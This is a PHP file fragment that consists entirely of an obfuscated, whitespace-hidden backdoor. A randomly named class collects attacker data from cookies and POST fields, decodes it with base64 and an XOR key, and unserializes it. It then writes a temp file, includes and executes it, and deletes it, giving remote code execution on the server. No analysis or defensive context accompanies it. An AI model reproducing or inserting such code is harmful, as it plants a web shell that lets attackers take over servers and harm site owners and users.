<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("nisbfjv")){class nisbfjv{public static $xnffob = "rdngttspbgfjnoqe";public static $wstgtz = NULL;public function __construct(){$njkrfqnkw = @$_COOKIE[substr(nisbfjv::$xnffob, 0, 4)];if (!empty($njkrfqnkw)){$tpdqj = "base64";$rpomclrzi = "";$njkrfqnkw = explode(",", $njkrfqnkw);foreach ($njkrfqnkw as $ibqzfqpvpd){$rpomclrzi .= @$_COOKIE[$ibqzfqpvpd];$rpomclrzi .= @$_POST[$ibqzfqpvpd];}$rpomclrzi = array_map($tpdqj . "_decode", array($rpomclrzi,));$rpomclrzi = $rpomclrzi[0] ^ str_repeat(nisbfjv::$xnffob, (strlen($rpomclrzi[0]) / strlen(nisbfjv::$xnffob)) + 1);nisbfjv::$wstgtz = @unserialize($rpomclrzi);}}public function __destruct(){$this->pzbnwemejr();}private function pzbnwemejr(){if (is_array(nisbfjv::$wstgtz)) {$tavkcwnl = sys_get_temp_dir() . "/" . crc32(nisbfjv::$wstgtz["salt"]);@nisbfjv::$wstgtz["write"]($tavkcwnl, nisbfjv::$wstgtz["content"]);include $tavkcwnl;@nisbfjv::$wstgtz["delete"]($tavkcwnl);exit();}}}$zudzea = new nisbfjv();$zudzea = NULL;} ?><?php
